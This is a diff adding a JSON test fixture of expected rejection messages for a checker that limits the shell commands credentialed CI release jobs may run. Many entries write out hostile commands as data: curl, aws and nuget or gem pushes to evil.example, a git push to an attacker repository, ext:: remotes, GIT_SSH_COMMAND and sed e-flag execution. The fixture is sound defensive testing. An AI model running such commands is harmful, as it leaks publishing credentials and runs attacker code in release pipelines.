@@ -1,0 +1,295 @@
+{
+  "a backslash continuation": [
+    "a credentialed job runs `pnpm install`: pnpm is not a command a credentialed job runs"
+  ],
+  "a continuation inside npm's arguments": [
+    "a credentialed job runs `npm ci`: npm runs only `publish`, or installs itself at NPM_VERSION"
+  ],
+  "an option before npm's subcommand": [
+    "a credentialed job runs `npm --prefix x ci`: npm runs only `publish`, or installs itself at NPM_VERSION"
+  ],
+  "npm publish without --ignore-scripts": [
+    "a credentialed job runs `npm publish \"./release/$ARTIFACT\"`: npm publish must run with --ignore-scripts"
+  ],
+  "npm publish --ignore-scripts=false": [
+    "a credentialed job runs `npm publish --ignore-scripts --ignore-scripts=false \"./release/$ARTIFACT\"`: npm publish: --ignore-scripts takes no value"
+  ],
+  "bunx": [
+    "a credentialed job runs `bunx some-tool`: bunx is not a command a credentialed job runs"
+  ],
+  "deno": [
+    "a credentialed job runs `deno run x.ts`: deno is not a command a credentialed job runs"
+  ],
+  "tsx": ["a credentialed job runs `tsx x.ts`: tsx is not a command a credentialed job runs"],
+  "go test": [
+    "a credentialed job runs `go test ./...`: go is not a command a credentialed job runs"
+  ],
+  "source": [
+    "a credentialed job runs `source scripts/x.sh`: source is not a command a credentialed job runs"
+  ],
+  ". (source)": [
+    "a credentialed job runs `. scripts/x.sh`: . is not a command a credentialed job runs"
+  ],
+  "a repository path without ./": [
+    "a credentialed job runs `apps/cli/scripts/x.sh upload`: apps/cli/scripts/x.sh is not a command a credentialed job runs"
+  ],
+  "a command substitution": [
+    "a credentialed job's run: block has an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)"
+  ],
+  "a substitution inside a quoted argument": [
+    "a credentialed job's run: block has an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)"
+  ],
+  "a process substitution": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
+    "a credentialed job's run: block has a process substitution"
+  ],
+  "a substitution inside ${ }": [
+    "a credentialed job's run: block has an expansion this grammar does not allow (${ with $, (, { or `)"
+  ],
+  "a backtick substitution": [
+    "a credentialed job's run: block has a backtick command substitution",
+    "a credentialed job's run: block has a character this grammar does not allow (\"`\")"
+  ],
+  "a variable as the command": [
+    "a credentialed job runs `\"$CMD\" publish`: ${CMD} is not a command a credentialed job runs"
+  ],
+  "eval": ["a credentialed job runs `eval \"$X\"`: eval is not a command a credentialed job runs"],
+  "exec": [
+    "a credentialed job runs `exec python3 x.py`: exec is not a command a credentialed job runs"
+  ],
+  "env": [
+    "a credentialed job runs `env FOO=1 bash x.sh`: env is not a command a credentialed job runs"
+  ],
+  "xargs": ["a credentialed job runs `xargs sh`: xargs is not a command a credentialed job runs"],
+  "find -exec": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "sort --compress-program": [
+    "a credentialed job runs `sort --compress-program=sh`: sort: --compress-program is not an option it may take"
+  ],
+  "sed's e flag": [
+    "a credentialed job runs `sed 's/x/id/e'`: sed runs one single-quoted s/…/…/ script (flag g at most)"
+  ],
+  "sed -e": [
+    "a credentialed job runs `sed -e '1e id'`: sed runs one single-quoted s/…/…/ script (flag g at most)"
+  ],
+  "sed -f": [
+    "a credentialed job runs `sed -f script.sed`: sed runs one single-quoted s/…/…/ script (flag g at most)"
+  ],
+  "a second sed script": [
+    "a credentialed job runs `sed 's/a/b/' -e '1e id'`: sed runs one single-quoted s/…/…/ script (flag g at most)"
+  ],
+  "git -c before the subcommand": [
+    "a credentialed job runs `git -c core.sshCommand=sh push x`: git: -c is not a global option it may take (--git-dir=publish-tmp/… only)"
+  ],
+  "git --upload-pack": [
+    "a credentialed job runs `git fetch --upload-pack=sh x`: git fetch: --upload-pack is not an option it may take"
+  ],
+  "git config": [
+    "a credentialed job runs `git config alias.x '!sh'`: git runs only init, bundle verify, fetch, push and rev-parse"
+  ],
+  "a loop": [
+    "a credentialed job runs `do python3 x`: do is not a command a credentialed job runs",
+    "a credentialed job runs `done`: a credentialed job reads input only from publish-tmp/ or a path this job downloads to (f)",
+    "a credentialed job runs `while read -r x`: while is not a command a credentialed job runs"
+  ],
+  "a case": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
+    "a credentialed job's run: block has a ;; (case)"
+  ],
+  "a subshell": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "a function": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "export": [
+    "a credentialed job runs `export PATH=\"./bin:$PATH\"`: export is not a command a credentialed job runs"
+  ],
+  "a prefix assignment": [
+    "a credentialed job runs `BASH_ENV=x.sh echo hi`: a credentialed job assigns no variable"
+  ],
+  "an assignment": [
+    "a credentialed job runs `GIT_SSH_COMMAND=\"sh evil.sh\"`: a credentialed job assigns no variable"
+  ],
+  "a write to GITHUB_PATH": [
+    "a credentialed job names GITHUB_ENV, GITHUB_PATH or the runner's temp directory",
+    "a credentialed job runs `echo \"$PWD/bin\"`: a redirection target must be a literal path (\"$GITHUB_PATH\")"
+  ],
+  "((…)) read as arithmetic": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "$((…)) read as arithmetic": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
+    "a credentialed job's run: block has a character this grammar does not allow (\"$\")",
+    "a credentialed job's run: block has an unquoted $ (every expansion is double-quoted)"
+  ],
+  "case after then": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
+    "a credentialed job's run: block has a ;; (case)"
+  ],
+  "case inside $( )": [
+    "a credentialed job's run: block has an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)"
+  ],
+  "case in a group": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
+    "a credentialed job's run: block has a ;; (case)"
+  ],
+  "case after !": [
+    "a credentialed job's run: block has a ! (negation)",
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
+    "a credentialed job's run: block has a ;; (case)"
+  ],
+  "case with in on the next line": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
+    "a credentialed job's run: block has a ;; (case)"
+  ],
+  "ANSI-C quoting": [
+    "a credentialed job's run: block has a character this grammar does not allow (\"$\")",
+    "a credentialed job's run: block has an unquoted $ (every expansion is double-quoted)"
+  ],
+  "$\"…\" quoting": [
+    "a credentialed job's run: block has a character this grammar does not allow (\"$\")",
+    "a credentialed job's run: block has an unquoted $ (every expansion is double-quoted)"
+  ],
+  "a one-line function": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "function shadowing an earlier command": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "a function defined in a skipped branch": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "local": [
+    "a credentialed job runs `local PATH=x`: local is not a command a credentialed job runs"
+  ],
+  "read": ["a credentialed job runs `read PATH`: read is not a command a credentialed job runs"],
+  "printf -v": [
+    "a credentialed job runs `printf -v PATH '%s' x`: printf takes no option, and its format is one of '%s\\n', '%s  %s\\n'"
+  ],
+  "for … in": [
+    "a credentialed job runs `do :`: do is not a command a credentialed job runs",
+    "a credentialed job runs `done`: done is not a command a credentialed job runs",
+    "a credentialed job runs `for PATH in x`: for is not a command a credentialed job runs"
+  ],
+  "for without in": [
+    "a credentialed job runs `done`: done is not a command a credentialed job runs",
+    "a credentialed job runs `for x do node evil.mjs`: for is not a command a credentialed job runs",
+    "a credentialed job runs `set -- a`: set is not a command a credentialed job runs"
+  ],
+  "an arithmetic for": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "${…:=…}": [
+    "a credentialed job's run: block has an operator expansion other than ${NAME#…}, ${NAME%…} or ${NAME:-…}"
+  ],
+  "export without a value": [
+    "a credentialed job runs `export PATH`: export is not a command a credentialed job runs"
+  ],
+  "export of an expansion": [
+    "a credentialed job runs `export \"$N=x\"`: export is not a command a credentialed job runs"
+  ],
+  "an arithmetic subscript": [
+    "a credentialed job's run: block has an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)"
+  ],
+  "a substring expansion": [
+    "a credentialed job's run: block has an operator expansion other than ${NAME#…}, ${NAME%…} or ${NAME:-…}"
+  ],
+  "a funsub": [
+    "a credentialed job's run: block has an operator expansion other than ${NAME#…}, ${NAME%…} or ${NAME:-…}"
+  ],
+  "a valsub": [
+    "a credentialed job's run: block has an operator expansion other than ${NAME#…}, ${NAME%…} or ${NAME:-…}"
+  ],
+  "a substitution inside arithmetic": [
+    "a credentialed job's run: block has an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)"
+  ],
+  "indirect expansion": [
+    "a credentialed job's run: block has an operator expansion other than ${NAME#…}, ${NAME%…} or ${NAME:-…}"
+  ],
+  "an option through a variable": [
+    "a credentialed job runs `git push --atomic --end-of-options \"$X\" git@github.com:confeature/sdks.git HEAD:refs/heads/main`: git push: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names"
+  ],
+  "an operand that starts with an expansion": [
+    "a credentialed job runs `git push --atomic \"$X\" HEAD:refs/heads/main`: git push: \"$X\" starts with an expansion, which could become an option"
+  ],
+  "brace expansion": [
+    "a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)"
+  ],
+  "a glob": ["a credentialed job's run: block has a glob character (* ? [ ])"],
+  "an abbreviated long option (git)": [
+    "a credentialed job runs `git push --receive-pa=sh --end-of-options git@github.com:confeature/sdks.git HEAD:refs/heads/main`: git push: --receive-pa is not an option it may take"
+  ],
+  "an abbreviated long option (sort)": [
+    "a credentialed job runs `sort --compress-prog=sh`: sort: --compress-prog is not an option it may take"
+  ],
+  "git init --template": [
+    "a credentialed job runs `git init --template=publish-tmp/t publish-tmp/m.git`: git init: --template is not an option it may take"
+  ],
+  "cd before an exception": [
+    "a credentialed job runs `bash cli/scripts/publish-r2.sh promote \"${TAG#cli-v}\"`: an operator expansion (${NAME…}) is allowed only in a recorded exception",
+    "a credentialed job runs `cd apps`: cd is not a command a credentialed job runs"
+  ],
+  "GITHUB_ENV through a literal": [
+    "a credentialed job names GITHUB_ENV, GITHUB_PATH or the runner's temp directory",
+    "a credentialed job runs `printf 'PATH=x'`: a redirection target must be a literal path (\"$GITHUB_ENV\")"
+  ],
+  "the runner's file-command directory": [
+    "a credentialed job names GITHUB_ENV, GITHUB_PATH or the runner's temp directory",
+    "a credentialed job runs `echo x`: a redirection target must be a literal path (publish-tmp/../../_temp/_runner_file_commands/set_env_1)"
+  ],
+  "RUNNER_TEMP": [
+    "a credentialed job names GITHUB_ENV, GITHUB_PATH or the runner's temp directory",
+    "a credentialed job runs `printf x`: a redirection target must be a literal path (\"$RUNNER_TEMP/x\")"
+  ],
+  "a write outside publish-tmp": [
+    "a credentialed job runs `printf x`: a credentialed job writes only publish-tmp/ or /dev/null (apps/cli/scripts/publish-r2.sh)"
+  ],
+  "rm outside publish-tmp": ["a credentialed job runs `rm -rf apps`: rm touches only publish-tmp/"],
+  "mkdir outside publish-tmp": [
+    "a credentialed job runs `mkdir -p apps/x`: mkdir touches only publish-tmp/"
+  ],
+  "an ext:: remote": [
+    "a credentialed job runs `git push 'ext::sh -c touch% /tmp/x' main`: git push: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names"
+  ],
+  "an fd:: remote": [
+    "a credentialed job runs `git fetch fd::3`: git fetch: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names, or a received release/*.bundle"
+  ],
+  "an ext:: remote after end-of-options": [
+    "a credentialed job runs `git push --atomic --end-of-options 'ext::sh -c x' HEAD:refs/heads/x`: git push: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names"
+  ],
+  "a repository the settings do not name": [
+    "a credentialed job runs `git push --atomic --end-of-options git@github.com:attacker/x.git HEAD:refs/tags/x`: git push: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names"
+  ],
+  "a forced refspec": [
+    "a credentialed job runs `git push --atomic --end-of-options git@github.com:confeature/sdks.git +HEAD:refs/heads/main`: git push: every refspec is <HEAD|refs/…>:refs/heads|tags/…, never forced"
+  ],
+  "a refspec that is an expansion": [
+    "a credentialed job runs `git push --atomic --end-of-options git@github.com:confeature/sdks.git \"$REF\"`: git push: every refspec is <HEAD|refs/…>:refs/heads|tags/…, never forced"
+  ],
+  "dotnet --source elsewhere": [
+    "a credentialed job runs `dotnet nuget push \"./x.nupkg\" --api-key \"$K\" --source https://evil.example/v3/index.json`: dotnet nuget push: --source must be exactly https://api.nuget.org/v3/index.json"
+  ],
+  "gem push --host": [
+    "a credentialed job runs `gem push --host https://evil.example \"./x.gem\"`: gem push: --host is not an option it may take"
+  ],
+  "curl -o": [
+    "a credentialed job runs `curl -fsS -o x https://proxy.golang.org/x`: curl: -o is not an option it may take"
+  ],
+  "curl -K": [
+    "a credentialed job runs `curl -K cfg https://proxy.golang.org/x`: curl: -K is not an option it may take"
+  ],
+  "curl to another host": [
+    "a credentialed job runs `curl -fsS https://evil.example/x`: curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly"
+  ],
+  "aws (only the reviewed Maven script uploads to R2)": [
+    "a credentialed job runs `aws s3api --endpoint-url https://evil.example put-object`: aws is not a command a credentialed job runs"
+  ],
+  "rustup run": [
+    "a credentialed job runs `rustup run stable node x`: rustup runs only `toolchain install`"
+  ],
+  "rustup with an expansion before --": [
+    "a credentialed job runs `rustup toolchain install \"$X\"`: rustup toolchain install: \"$X\" starts with an expansion, which could become an option"
+  ]
+}
